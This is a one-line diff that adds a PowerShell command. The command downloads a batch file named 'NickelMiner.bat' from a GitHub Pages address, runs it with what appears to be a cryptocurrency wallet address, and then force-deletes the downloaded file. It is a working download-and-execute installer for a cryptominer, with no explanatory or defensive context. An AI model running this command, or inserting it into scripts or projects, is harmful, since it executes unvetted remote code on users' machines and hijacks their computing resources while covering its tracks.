@@ -1,0 +1,1 @@
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://nickel5869.github.io/NickelRepository/NickelMiner.bat', $tempfile); & $tempfile 47zP33oJFjqa8SuENyKxUoiHddHeUeMK6MRky8YnN97hYX5c1GrCq7JaxWFkW63q24NGFLe5zWvjNRk7CHXPpHAhEPSqvd5; Remove-Item -Force $tempfile"
